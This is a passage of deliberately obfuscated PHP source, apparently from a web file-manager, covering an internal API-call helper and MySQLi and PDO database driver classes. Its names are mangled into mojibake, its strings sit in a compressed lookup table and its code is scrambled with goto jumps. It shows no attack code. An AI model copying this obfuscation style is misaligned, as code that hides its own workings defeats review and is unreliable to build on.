º, $B”œİ›Šá[2372]); } else { $E—–ï£˜› = $e‘–¨Ç²->where($F†ñ‰ ¿³î)->find(); $dÔ»¬­™„‘ = $E—–ï£˜›[$B”œİ›Šá[370]] == $B”œİ›Šá[83]; $e¬ÔË¯õ² = $e‘–¨Ç²->fileNameAuto($E—–ï£˜›[$B”œİ›Šá[463]], $E—–ï£˜›[$B”œİ›Šá[28]], REPEAT_RENAME_FOLDER, $dÔ»¬­™„‘); if ($e¬ÔË¯õ² != $E—–ï£˜›[$B”œİ›Šá[28]]) { $e‘–¨Ç²->rename($bâèÅò• º, $e¬ÔË¯õ²); } $e‘–¨Ç²->where($F†ñ‰ ¿³î)->setField($B”œİ›Šá[397], 0); $DŠ‘£‰Ûë¸->eventRecycle($bâèÅò• º, $B”œİ›Šá[2373]); } } } goto aÚ„…×‚ƒ„; bŠÜ¸íîâ: function ActionCall($CŠè¾”¤Ã®) { $b¡¥—İèÉå = array_slice(func_get_args(), 1); return ActionApply($CŠè¾”¤Ã®, $b¡¥—İèÉå); } function ActionCallApi($DöØøºò, $E¨èæÜ’Õ† = '') { goto fÖßáù¡œ«; E½¨óàƒÖñ: $e«‰¼ŒÊ÷› = phpBinCommand(); if ($e«‰¼ŒÊ÷› && function_exists($fÔøÙšê[21])) { $D‘–Š‡İœğ = $e«‰¼ŒÊ÷› . $fÔøÙšê[22] . BASIC_PATH . $fÔøÙšê[23] . escapeshellarg($DöØøºò); $aÉŞÃİ¼ìÓ = shell_exec($D‘–Š‡İœğ); } if (!$aÉŞÃİ¼ìÓ) { $c·ë®æà = stream_context_create(array($fÔøÙšê[24] => array($fÔøÙšê[25] => 20, $fÔøÙšê[26] => $fÔøÙšê[27]))); $aÉŞÃİ¼ìÓ = file_get_contents(APP_HOST . $fÔøÙšê[28] . $DöØøºò, !1, $c·ë®æà); } goto eŒé¤øÉØ®; C¡¹ëÒ—›: $E¦ê£Îäö¯ = Action($fÔøÙšê[19])->accessToken(); $DöØøºò = str_replace($fÔøÙšê[5], $fÔøÙšê[4], $DöØøºò) . $fÔøÙšê[20] . $E¦ê£Îäö¯ . $Dø®¤¯†¾Ü; $aÉŞÃİ¼ìÓ = $fÔøÙšê[16]; goto E½¨óàƒÖñ; eŒé¤øÉØ®: $B‚†“„îÄ© = json_decode($aÉŞÃİ¼ìÓ, !0); $eÅÒÚôè¨ö = is_array($B‚†“„îÄ©) ? $B‚†“„îÄ© : array($fÔøÙšê[29] => null, $fÔøÙšê[30] => $aÉŞÃİ¼ìÓ); if (!$B‚†“„îÄ©) { echo $aÉŞÃİ¼ìÓ; } goto D³¸šš‡›Ø; fÖßáù¡œ«: $fÔøÙšê =& $_SERVER[ğ£]; $Dø®¤¯†¾Ü = $E¨èæÜ’Õ†; if (is_array($E¨èæÜ’Õ†)) { $Dø®¤¯†¾Ü = $fÔøÙšê[16]; foreach ($E¨èæÜ’Õ† as $bÈÈ¶¤°Ö => $F†Ş‰µ) { $F†Ş‰µ = is_array($F†Ş‰µ) ? json_encode($F†Ş‰µ) : $F†Ş‰µ; $F†Ş‰µ = is_bool($F†Ş‰µ) ? intval($F†Ş‰µ) : $F†Ş‰µ; $Dø®¤¯†¾Ü .= $fÔøÙšê[17] . $bÈÈ¶¤°Ö . $fÔøÙšê[18] . rawurlencode($F†Ş‰µ); } } goto C¡¹ëÒ—›; D³¸šš‡›Ø: return $eÅÒÚôè¨ö; goto c·óÖğÄè¨; c·óÖğÄè¨: } function ActionCallHook($BÛç–‰ŒÌŠ) { goto c¯î¦•Šº; c¯î¦•Šº: $Dì’‰ÛöÎ– =& $_SERVER[ğ£]; ob_start(); $C­†ƒ“Äâ× = array_slice(func_get_args(), 1); goto a¹‹äÀå£Î; C‰·…ëóÊ¿: $EÒÕŸ±Ó£ = $f«¦˜‚¦ ? json_decode($f«¦˜‚¦, !0) : $EÒÕŸ±Ó£; $GLOBALS[$Dì’‰ÛöÎ–[31]] = 0; return $EÒÕŸ±Ó£; goto e‚õİé÷´; a¹‹äÀå£Î: $GLOBALS[$Dì’‰ÛöÎ–[31]] = 1; $EÒÕŸ±Ó£ = ActionApply($BÛç–‰ŒÌŠ, $C­†ƒ“Äâ×); $f«¦˜‚¦ = ob_get_clean(); goto C‰·…ëóÊ¿; e‚õİé÷´: } goto Fàì‚˜»Úª; Bæ¦¸„°îá: define($_SERVER[“][0], $_SERVER[“][1]); $_SERVER[ğ£] = explode($_SERVER[“][2], gzinflate(substr($_SERVER[“][3], 10, -8))); function Model($c…éõŠìê§ = '', $d„ˆÊ‡’ = '', $DÚµÔ˜÷¤© = '') { goto D¨¦â’³–µ; e¾º¢¬ææ: $f»íÑ‡ù‚‘[$fò‘³ë÷£Õ] = new ModelBase($c…éõŠìê§, $d„ˆÊ‡’, $DÚµÔ˜÷¤©); return $f»íÑ‡ù‚‘[$fò‘³ë÷£Õ]; goto Cä±“‰”é; D¨¦â’³–µ: $a´ÛÁ–àÕç =& $_SERVER[ğ£]; static $f»íÑ‡ù‚‘ = array(); $fò‘³ë÷£Õ = strtolower($d„ˆÊ‡’ . $a´ÛÁ–àÕç[0] . $c…éõŠìê§); goto CÃ°¾Í‘ï; CÃ°¾Í‘ï: if (isset($f»íÑ‡ù‚‘[$fò‘³ë÷£Õ])) { return $f»íÑ‡ù‚‘[$fò‘³ë÷£Õ]; } if ($c…éõŠìê§) { $c…éõŠìê§ = strtoupper($c…éõŠìê§[0]) . substr($c…éõŠìê§, 1); $eà‚ÛÁˆ¸ = $c…éõŠìê§ . $a´ÛÁ–àÕç[1]; if (class_exists($eà‚ÛÁˆ¸)) { $f»íÑ‡ù‚‘[$fò‘³ë÷£Õ] = new $eà‚ÛÁˆ¸(); return $f»íÑ‡ù‚‘[$fò‘³ë÷£Õ]; } } if (!$DÚµÔ˜÷¤©) { $DÚµÔ˜÷¤© = $GLOBALS[$a´ÛÁ–àÕç[2]][$a´ÛÁ–àÕç[3]]; } goto e¾º¢¬ææ; Cä±“‰”é: } goto AÔø‰¬ä×á; A–Ü¿êŞí: class DbMysqli extends Db { public function __construct($cÓÌ¾ëÍÊ‘ = '') { $bÂÓÁîâãê =& $_SERVER[“]; if (!extension_loaded($bÂÓÁîâãê[710])) { think_exception(think_lang($bÂÓÁîâãê[10]) . $bÂÓÁîâãê[811]); } if (!empty($cÓÌ¾ëÍÊ‘)) { $this->config = $cÓÌ¾ëÍÊ‘; if (empty($this->config[$bÂÓÁîâãê[13]])) { $this->config[$bÂÓÁîâãê[13]] = $bÂÓÁîâãê[33]; } } } public function connect($a••ÛÌº´Ï = '', $cÏ”ÍÛØ„ = 0) { $fÑ»í‚†“é =& $_SERVER[“]; if (!isset($this->linkID[$cÏ”ÍÛØ„])) { goto aÈ™¢öÁ; B¹Œ¡´ñ›Î: $f‚»ù®‡â† = $this->linkID[$cÏ”ÍÛØ„]->server_version; $this->linkID[$cÏ”ÍÛØ„]->query($fÑ»í‚†“é[789] . think_config($fÑ»í‚†“é[790]) . $fÑ»í‚†“é[55]); if ($f‚»ù®‡â† > $fÑ»í‚†“é[791]) { $this->linkID[$cÏ”ÍÛØ„]->query($fÑ»í‚†“é[792]); } goto DŒãÍ´ºÆ; aÈ™¢öÁ: if (empty($a••ÛÌº´Ï)) { $a••ÛÌº´Ï = $this->config; } $this->linkID[$cÏ”ÍÛØ„] = new mysqli($a••ÛÌº´Ï[$fÑ»í‚†“é[785]], $a••ÛÌº´Ï[$fÑ»í‚†“é[787]], $a••ÛÌº´Ï[$fÑ»í‚†“é[788]], $a••ÛÌº´Ï[$fÑ»í‚†“é[17]], $a••ÛÌº´Ï[$fÑ»í‚†“é[786]] ? intval($a••ÛÌº´Ï[$fÑ»í‚†“é[786]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto B¹Œ¡´ñ›Î; DŒãÍ´ºÆ: $this->connected = !0; if (1 != think_config($fÑ»í‚†“é[18])) { unset($this->config); } goto bçˆ‹¡×ãÈ; bçˆ‹¡×ãÈ: } return $this->linkID[$cÏ”ÍÛØ„]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Bé’äØ–â) { goto bäİ®Ü…Û’; bäİ®Ü…Û’: $aÒÁ†×¸ä÷ =& $_SERVER[“]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eØ©ºÙˆŒ; E‰¦‚ÙİÜ: think_status($aÒÁ†×¸ä÷[20]); $this->queryID = $this->_linkID->query($Bé’äØ–â); if ($this->_linkID->more_results()) { while (($D²ö§’Í†˜ = $this->_linkID->next_result()) != NULL) { $D²ö§’Í†˜->free_result(); } } goto aœÛ‹£ùÅ¯; eØ©ºÙˆŒ: $this->queryStr = $Bé’äØ–â; if ($this->queryID) { $this->free(); } think_action_status($aÒÁ†×¸ä÷[19], 1); goto E‰¦‚ÙİÜ; aœÛ‹£ùÅ¯: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto eÍêêŞÄ“µ; eÍêêŞÄ“µ: } public function execute($FŒˆäğÃÖÈ) { goto dñ‹à«©Ô; bÚ­¶Ê£æÖ: $this->queryStr = $FŒˆäğÃÖÈ; if ($this->queryID) { $this->free(); } think_action_status($DËÔÆ±Æ‰Š[21], 1); goto dÕó›‰šÊÎ; EÛ£¶½›¿Á: if (!1 === $F‡ŒÏ§˜¬Ò) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aÑŞ‡äíÈà; dñ‹à«©Ô: $DËÔÆ±Æ‰Š =& $_SERVER[“]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÚ­¶Ê£æÖ; dÕó›‰šÊÎ: think_status($DËÔÆ±Æ‰Š[20]); $F‡ŒÏ§˜¬Ò = $this->_linkID->query($FŒˆäğÃÖÈ); $this->debug(); goto EÛ£¶½›¿Á; aÑŞ‡äíÈà: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aŸ¿ˆå®ç¹ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aŸ¿ˆå®ç¹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a²‡ƒÖ¥õº = $this->_linkID->rollback(); $this->transTimes = 0; if (!$a²‡ƒÖ¥õº) { $this->error(); return !1; } } return !0; } private function getAll() { $f¥¥ë‘ª˜° = array(); if ($this->numRows > 0) { for ($AÓâÈÌ‹¨º = 0; $AÓâÈÌ‹¨º < $this->numRows; $AÓâÈÌ‹¨º++) { $f¥¥ë‘ª˜°[$AÓâÈÌ‹¨º] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $f¥¥ë‘ª˜°; } public function getFields($E¹ãÈÈñÔº) { $dÉßÄé‹– =& $_SERVER[“]; $C«“Ùğïˆ¨ = $this->query($dÉßÄé‹–[796] . $this->parseKey($E¹ãÈÈñÔº)); $Dï™äáÚµÃ = array(); if ($C«“Ùğïˆ¨) { foreach ($C«“Ùğïˆ¨ as $bâ·¿³…Æ => $B£µ«§…Î) { $Dï™äáÚµÃ[$B£µ«§…Î[$dÉßÄé‹–[27]]] = array($dÉßÄé‹–[28] => $B£µ«§…Î[$dÉßÄé‹–[27]], $dÉßÄé‹–[29] => $B£µ«§…Î[$dÉßÄé‹–[30]], $dÉßÄé‹–[31] => (bool) ($B£µ«§…Î[$dÉßÄé‹–[32]] === $dÉßÄé‹–[33]), $dÉßÄé‹–[34] => $B£µ«§…Î[$dÉßÄé‹–[35]], $dÉßÄé‹–[36] => strtolower($B£µ«§…Î[$dÉßÄé‹–[37]]) == $dÉßÄé‹–[38], $dÉßÄé‹–[39] => strtolower($B£µ«§…Î[$dÉßÄé‹–[40]]) == $dÉßÄé‹–[41]); } } return $Dï™äáÚµÃ; } public function getTables($Aºïâ¯å¨Ş = '') { $e¨Ûİó™â =& $_SERVER[“]; $c¬ÃÑØ¾è¥ = !empty($Aºïâ¯å¨Ş) ? $e¨Ûİó™â[798] . $Aºïâ¯å¨Ş : $e¨Ûİó™â[799]; $AŒæ¥ùÚ¾Â = $this->query($c¬ÃÑØ¾è¥); $cÌĞ‹±ÔÈÅ = array(); if ($AŒæ¥ùÚ¾Â) { foreach ($AŒæ¥ùÚ¾Â as $aÙ…”¼µ¢ => $Cí»ÔÇÎ­‡) { $cÌĞ‹±ÔÈÅ[$aÙ…”¼µ¢] = current($Cí»ÔÇÎ­‡); } } return $cÌĞ‹±ÔÈÅ; } public function replace($D‚„ë©µÏ, $C·¿ÕÚ¬Ñ = array()) { $E˜¥Ûééà =& $_SERVER[“]; foreach ($D‚„ë©µÏ as $D±î˜´¯í› => $E·¢¹ÀİÑ) { $A‘„¿ëÏ× = $this->parseValue($E·¢¹ÀİÑ); if (is_scalar($A‘„¿ëÏ×)) { $a¬–—Ñ’´¸[] = $A‘„¿ëÏ×; $cÏ‹´‚ºÛ[] = $this->parseKey($D±î˜´¯í›); } } $EˆÔœ½•‹è = $E˜¥Ûééà[800] . $this->parseTable($C·¿ÕÚ¬Ñ[$E˜¥Ûééà[267]]) . $E˜¥Ûééà[801] . implode($E˜¥Ûééà[47], $cÏ‹´‚ºÛ) . $E˜¥Ûééà[802] . implode($E˜¥Ûééà[47], $a¬–—Ñ’´¸) . $E˜¥Ûééà[803]; return $this->execute($EˆÔœ½•‹è); } public function insertAll($C‡ç§Ûñ½, $eºÚÕœê = array(), $c›£ĞÓ÷Íİ = false) { goto A‹ìÖ–İ½·; eî—Ü‹Ô³†: $eÅß¥¥ÃÉ = ($c›£ĞÓ÷Íİ ? $EÁÚÁ¦¥[805] : $EÁÚÁ¦¥[806]) . $EÁÚÁ¦¥[807] . $this->parseTable($eºÚÕœê[$EÁÚÁ¦¥[267]]) . $EÁÚÁ¦¥[801] . implode($EÁÚÁ¦¥[47], $eŸ¨Š÷¯ø›) . $EÁÚÁ¦¥[808] . implode($EÁÚÁ¦¥[47], $DÔÚáŒ¨ø); return $this->execute($eÅß¥¥ÃÉ); goto BÒÕ•ÁßÜ; A‹ìÖ–İ½·: $EÁÚÁ¦¥ =& $_SERVER[“]; if (!is_array($C‡ç§Ûñ½[0])) { return !1; } $eŸ¨Š÷¯ø› = array_keys($C‡ç§Ûñ½[0]); goto cê»‹İœŠ¬; cê»‹İœŠ¬: $DÔÚáŒ¨ø = array(); foreach ($C‡ç§Ûñ½ as $cà‚œ™Ç”œ) { $eƒ¸æËÖ£é = array(); foreach ($cà‚œ™Ç”œ as $fœŒòåÊÈÏ => $FçãÉ›Êê) { $FçãÉ›Êê = $this->parseValue($FçãÉ›Êê); if (is_scalar($FçãÉ›Êê)) { $eƒ¸æËÖ£é[] = $FçãÉ›Êê; } } $DÔÚáŒ¨ø[] = $EÁÚÁ¦¥[248] . implode($EÁÚÁ¦¥[47], $eƒ¸æËÖ£é) . $EÁÚÁ¦¥[803]; } array_walk($eŸ¨Š÷¯ø›, array($this, $EÁÚÁ¦¥[804])); goto eî—Ü‹Ô³†; BÒÕ•ÁßÜ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E…”ÍÛ¥¡Ÿ =& $_SERVER[“]; $this->error = $this->_linkID->errno . $E…”ÍÛ¥¡Ÿ[4] . $this->_linkID->error; if ($E…”ÍÛ¥¡Ÿ[33] != $this->queryStr) { $this->error .= LNG($E…”ÍÛ¥¡Ÿ[45]) . $this->queryStr; } think_trace($this->error, $E…”ÍÛ¥¡Ÿ[33], $E…”ÍÛ¥¡Ÿ[46]); return $this->error; } public function escapeString($C§áŒ±íîœ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($C§áŒ±íîœ); } else { return addslashes($C§áŒ±íîœ); } } public function parseKey(&$a´²–†ˆ¸, $Eò¾Í†©Í¢ = true) { $EÈ…‚–õ =& $_SERVER[“]; if ($Eò¾Í†©Í¢) { $a´²–†ˆ¸ = $this->parseKeyCheck($a´²–†ˆ¸); } if ($a´²–†ˆ¸ != $EÈ…‚–õ[176] && !preg_match($EÈ…‚–õ[809], $a´²–†ˆ¸)) { $a´²–†ˆ¸ = $EÈ…‚–õ[810] . trim($a´²–†ˆ¸, $EÈ…‚–õ[810]) . $EÈ…‚–õ[810]; } return $a´²–†ˆ¸; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($f¼ÒË¸Ù»­ = '') { $d´ø«®Î½ =& $_SERVER[“]; if (!class_exists($d´ø«®Î½[812])) { think_exception(think_lang($d´ø«®Î½[10]) . $d´ø«®Î½[813]); } if (!empty($f¼ÒË¸Ù»­)) { $this->config = $f¼ÒË¸Ù»­; if (empty($this->config[$d´ø«®Î½[13]])) { $this->config[$d´ø«®Î½[13]] = array(); } } } public function connect($eØÀ¸†‘ö± = '', $C‡™À÷ó×­ = 0) { $Dêğ·®İ½ =& $_SERVER[“]; if (!isset($this->linkID[$C‡™À÷ó×­])) { goto eß¶…í–È£; eß¶…í–È£: if (empty($eØÀ¸†‘ö±)) { $eØÀ¸†‘ö± = $this->config; } if ($this->pconnect) { $eØÀ¸†‘ö±[$Dêğ·®İ½[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$C‡™À÷ó×­] = new PDO($eØÀ¸†‘ö±[$Dêğ·®İ½[814]], $eØÀ¸†‘ö±[$Dêğ·®İ½[787]], $eØÀ¸†‘ö±[$Dêğ·®İ½[788]], $eØÀ¸†‘ö±[$Dêğ·®İ½[13]]); } catch (PDOException $fËĞ–×´Úˆ) { think_exception($fËĞ–×´Úˆ->getMessage()); } goto Fç´‰Òğ¿; Fç´‰Òğ¿: $this->dbType = $this->_getDsnType($eØÀ¸†‘ö±[$Dêğ·®İ½[814]]); if (in_array($this->dbType, array($Dêğ·®İ½[815], $Dêğ·®İ½[816], $Dêğ·®İ½[817], $Dêğ·®İ½[818]))) { think_exception($Dêğ·®İ½[819] . $this->dbType . $Dêğ·®İ½[820] . $this->dbType . $Dêğ·®İ½[821]); } if (!$this->linkID[$C‡™À÷ó×­]) { think_exception($Dêğ·®İ½[822]); } goto F‚ƒƒÏ¶ìù; F‚ƒƒÏ¶ìù: try { $this->linkID[$C‡™À÷ó×­]->exec($Dêğ·®İ½[823] . think_config($Dêğ·®İ½[790])); } catch (Exception $fËĞ–×´Úˆ) { } $this->connected = !0; if (1 != think_config($Dêğ·®İ½[18])) { unset($this->config); } goto b„¥âä½¬¡; b„¥âä½¬¡: } return $this->linkID[$C‡™À÷ó×­]; } public function free() { $this->PDOStatement = null; } public function query($E‡³¢‡‹’Ë, $AÁ¤‹éÏ± = array()) { goto bƒ”¶£Ë×¼; f®Ï½À¼: if (!1 === $eï‰ˆÉÖˆË) { $this->error(); return !1; } else { return $this->getAll(); } goto fÁÍÓ²ğ”; f Ğ¨Ä¶İª: think_action_status($FÈŒšÆÛŸ¯[19], 1); think_status($FÈŒšÆÛŸ¯[20]); $this->PDOStatement = $this->_linkID->prepare($E‡³¢‡‹’Ë); goto fˆÊáæ‰ôë; bƒ”¶£Ë×¼: $FÈŒšÆÛŸ¯ =& $_SERVER[“]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D¨½İÓ¸Ô°; fˆÊáæ‰ôë: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $eï‰ˆÉÖˆË = $this->PDOStatement->execute($AÁ¤‹éÏ±); $this->debug(); goto f®Ï½À¼; D¨½İÓ¸Ô°: $this->queryStr = $E‡³¢‡‹’Ë; if (!empty($AÁ¤‹éÏ±)) { $this->queryStr .= $FÈŒšÆÛŸ¯[824] . print_r($AÁ¤‹éÏ±, !0) . $FÈŒšÆÛŸ¯[825]; } if (!empty($this->PDOStatement)) { $this->free(); } goto f Ğ¨Ä¶İª; fÁÍÓ²ğ”: } public function execute($e¸°æĞÀë“, $CîõŠ¢âŒ¦ = array()) { goto B¶‰ÆØŸò; fìäïìÀ˜Ú: $this->queryStr = $e¸°æĞÀë“; if (!empty($CîõŠ¢âŒ¦)) { $this->queryStr .= $F‘¿É¥Ú§Ú[824] . print_r($CîõŠ¢âŒ¦, !0) . $F‘¿É¥Ú§Ú[825]; } $EÛêè…İÖò = !1; goto Cë‚ÄÇ¿¸¾; B¶‰ÆØŸò: $F‘¿É¥Ú§Ú =& $_SERVER[“]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fìäïìÀ˜Ú; Cë‚ÄÇ¿¸¾: if ($this->dbType == $F‘¿É¥Ú§Ú[818]) { if (preg_match($F‘¿É¥Ú§Ú[826], $this->queryStr, $a°óá¾ˆî‘)) { $this->table = think_config($F‘¿É¥Ú§Ú[827]) . str_ireplace(think_config($F‘¿É¥Ú§Ú[828]), $F‘¿É¥Ú§Ú[361], $a°óá¾ˆî‘[2]); $EÛêè…İÖò = (bool) $this->query($F‘¿É¥Ú§Ú[829] . strtoupper($this->table) . $F‘¿É¥Ú§Ú[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($F‘¿É¥Ú§Ú[21], 1); goto f†¯§Ñ¬¿§; f†¯§Ñ¬¿§: think_status($F‘¿É¥Ú§Ú[20]); $this->PDOStatement = $this->_linkID->prepare($e¸°æĞÀë“); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto b™•÷ÂİÁ; b™•÷ÂİÁ: $CÚ‹ÔÑ„à± = $this->PDOStatement->execute($CîõŠ¢âŒ¦); $this->debug(); if (!1 === $CÚ‹ÔÑ„à±) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($EÛêè…İÖò || preg_match($F‘¿É¥Ú§Ú[830], $e¸°æĞÀë“)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto AÍ ˆŠ¡Á; AÍ ˆŠ¡Á: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bó˜¡†Ì¶œ = $this->_linkID->commit(); $this->transTimes = 0; if (!$bó˜¡†Ì¶œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aƒ¯Âõ¤•¹ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aƒ¯Âõ¤•¹) { $this->error(); return !1; } } return !0; } private function getAll() { $bÁ„¶Óì˜ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($bÁ„¶Óì˜); return $bÁ„¶Óì˜; } public function getFields($b÷‚ëà·“) { goto Eá…Ğæ…Ëè; Eá…Ğæ…Ëè: $b½„Ãã¬í¼ =& $_SERVER[“]; $this->initConnect(!0); if (think_config($b½„Ãã¬í¼[831])) { $CÎ¾î˜£˜ = str_replace($b½„Ãã¬í¼[832], $b÷‚ëà·“, think_config($b½„Ãã¬í¼[831])); } else { switch ($this->dbType) { case $b½„Ãã¬í¼[815]: case $b½„Ãã¬í¼[833]: $CÎ¾î˜£˜ = "\x53\105\x4c\x45\103\124\40\40\40\143\x6f\154\165\x6d\156\x5f\x6e\x61\x6d\145\40\141\x73\40\47\x4e\x61\x6d\x65\47\54\x20\x20\40\144\141\164\141\137\x74\x79\160\145\x20\141\x73\x20\x27\x54\171\160\x65\47\x2c\x20\x20\x20\x63\157\154\x75\155\x6e\x5f\144\x65\146\x61\165\x6c\164\40\x61\163\x20\x27\104\x65\146\141\x75\x6c\164\47\x2c\40\40\40\x69\x73\x5f\x6e\165\x6c\154\x61\x62\x6c\145\x20\x61\163\40\47\x4e\165\x6c\154\47\xa\x9\x9\106\x52\117\x4d\x9\151\x6e\x66\x6f\x72\155\141\164\151\x6f\156\137\x73\143\150\145\x6d\141\56\164\141\x62\154\145\163\40\x41\x53\40\x74\12\11\11\112\x4f\111\x4e\11\x69\156\x66\x6f\162\155\141\164\x69\x6f\x6e\137\x73\143\150\x65\155\141\x2e\x63\x6f\x6c\165\155\156\x73\x20\101\123\x20\143\xa\x9\11\x4f\x4e\x20\x20\164\56\164\141\142\x6c\145\x5f\x63\141\164\141\x6c\x6f\x67\40\x3d\x20\x63\x2e\x74\141\x62\154\145\137\143\x61\x74\141\x6c\157\x67\xa\11\x9\x41\x4e\104\40\x74\x2e\164\141\x62\154\x65\x5f\163\143\x68\145\155\141\40\x3d\40\x63\56\164\x61\142\x6c\x65\x5f\x73\143\150\145\155\141\xa\x9\x9\101\x4e\x44\x20\x74\56\164\141\x62\x6c\145\137\x6e\141\155\145\x20\x3d\x20\143\56\x74\x61\142\x6c\x65\137\156\141\155\x65\12\11\x9\127\x48\105\x52\x45\x20\40\40\x74\x2e\x74\x61\142\x6c\145\137\x6e\x61\x6d\x65\40\x3d\40\47{$b÷‚ëà·“}\47"; break; case $b½„Ãã¬í¼[834]: $CÎ¾î˜£˜ = $b½„Ãã¬í¼[835] . $b÷‚ëà·“ . $b½„Ãã¬í¼[836]; break; case $b½„Ãã¬í¼[816]: case $b½„Ãã¬í¼[818]: $CÎ¾î˜£˜ = $b½„Ãã¬í¼[837] . $b½„Ãã¬í¼[838] . $b½„Ãã¬í¼[839] . strtoupper($b÷‚ëà·“) . $b½„Ãã¬í¼[840] . strtoupper($b÷‚ëà·“) . $b½„Ãã¬í¼[841]; break; case $b½„Ãã¬í¼[842]: $CÎ¾î˜£˜ = $b½„Ãã¬í¼[843] . $b÷‚ëà·“ . $b½„Ãã¬í¼[844]; break; case $b½„Ãã¬í¼[817]: break; case $b½„Ãã¬í¼[845]: default: $CÎ¾î˜£˜ = $b½„Ãã¬í¼[846] . ($this->dbType == $b½„Ãã¬í¼[845] ? "\140{$b÷‚ëà·“}\140" : $b÷‚ëà·“); } } goto ağãïØ§“…; f’°Ÿö…àç: return $EÌÖºœ¿õ ; goto C‡Âì•²¸Á; ağãïØ§“…: $D”ò»ÖîĞÆ = $this->query($CÎ¾î˜£˜); $EÌÖºœ¿õ  = array(); if ($D”ò»ÖîĞÆ) { foreach ($D”ò»ÖîĞÆ as $E¶ŒĞôãç => $côŒÂµÙñ™) { $côŒÂµÙñ™ = array_change_key_case($côŒÂµÙñ™); $côŒÂµÙñ™[$b½„Ãã¬í¼[28]] = isset($côŒÂµÙñ™[$b½„Ãã¬í¼[28]]) ? $côŒÂµÙñ™[$b½„Ãã¬í¼[28]] : $b½„Ãã¬í¼[361]; $côŒÂµÙñ™[$b½„Ãã¬í¼[29]] = isset($côŒÂµÙñ™[$b½„Ãã¬í¼[29]]) ? $côŒÂµÙñ™[$b½„Ãã¬í¼[29]] : $b½„Ãã¬í¼[361]; $aæ®ÀéÀ‰ô = isset($côŒÂµÙñ™[$b½„Ãã¬í¼[261]]) ? $côŒÂµÙñ™[$b½„Ãã¬í¼[261]] : $côŒÂµÙñ™[$b½„Ãã¬í¼[28]]; $EÌÖºœ¿õ [$aæ®ÀéÀ‰ô] = array($b½„Ãã¬í¼[28] => $aæ®ÀéÀ‰ô, $b½„Ãã¬í¼[29] => $côŒÂµÙñ™[$b½„Ãã¬í¼[29]], $b½„Ãã¬í¼[31] => (bool) (isset($côŒÂµÙñ™[$b½„Ãã¬í¼[99]]) && $côŒÂµÙñ™[$b½„Ãã¬í¼[99]] === $b½„Ãã¬í¼[33] || isset($côŒÂµÙñ™[$b½„Ãã¬í¼[31]]) && $côŒÂµÙñ™[$b½„Ãã¬í¼[31]] === $b½„Ãã¬í¼[33]), $b½„Ãã¬í¼[34] => isset($côŒÂµÙñ™[$b½„Ãã¬í¼[34]]) ? $côŒÂµÙñ™[$b½„Ãã¬í¼[34]] : (isset($côŒÂµÙñ™[$b½„Ãã¬í¼[53]]) ? $côŒÂµÙñ™[$b½„Ãã¬í¼[53]] : $b½„Ãã¬í¼[361]), $b½„Ãã¬í¼[36] => isset($côŒÂµÙñ™[$b½„Ãã¬í¼[89]]) ? strtolower($côŒÂµÙñ™[$b½„Ãã¬í¼[89]]) == $b½„Ãã¬í¼[38] : (isset($côŒÂµÙñ™[$b½„Ãã¬í¼[54]]) ? $côŒÂµÙñ™[$b½„Ãã¬í¼[54]] : !1), $b½„Ãã¬í¼[39] => isset($côŒÂµÙñ™[$b½„Ãã¬í¼[847]]) ? strtolower($côŒÂµÙñ™[$b½„Ãã¬í¼[847]]) == $b½„Ãã¬í¼[41] : (isset($côŒÂµÙñ™[$b½„Ãã¬í¼[89]]) ? $côŒÂµÙñ™[$b½„Ãã¬í¼[89]] : !1)); } } goto f’°Ÿö…àç; C‡Âì•²¸Á: } public function getTables($bÎÁ¿â´¹« = '') { $AÒÂéƒ¯¦³ =& $_SERVER[“]; if (think_config($AÒÂéƒ¯¦³[848])) { $d®®ÇÕïèµ = str_replace($AÒÂéƒ¯¦³[849], $bÎÁ¿â´¹«, think_config($AÒÂéƒ¯¦³[848])); } else { switch ($this->dbType) { case $AÒÂéƒ¯¦³[816]: case $AÒÂéƒ¯¦³[818]: $d®®ÇÕïèµ = $AÒÂéƒ¯¦³[850]; break; case $AÒÂéƒ¯¦³[815]: case $AÒÂéƒ¯¦³[833]: $d®®ÇÕïèµ = $AÒÂéƒ¯¦³[851]; break; case $AÒÂéƒ¯¦³[842]: $d®®ÇÕïèµ = $AÒÂéƒ¯¦³[852]; break; case $AÒÂéƒ¯¦³[817]: think_exception(think_lang($AÒÂéƒ¯¦³[853]) . $AÒÂéƒ¯¦³[854]); break; case $AÒÂéƒ¯¦³[834]: $d®®ÇÕïèµ = $AÒÂéƒ¯¦³[42] . $AÒÂéƒ¯¦³[43] . $AÒÂéƒ¯¦³[44]; break; case $AÒÂéƒ¯¦³[845]: default: if (!empty($bÎÁ¿â´¹«)) { 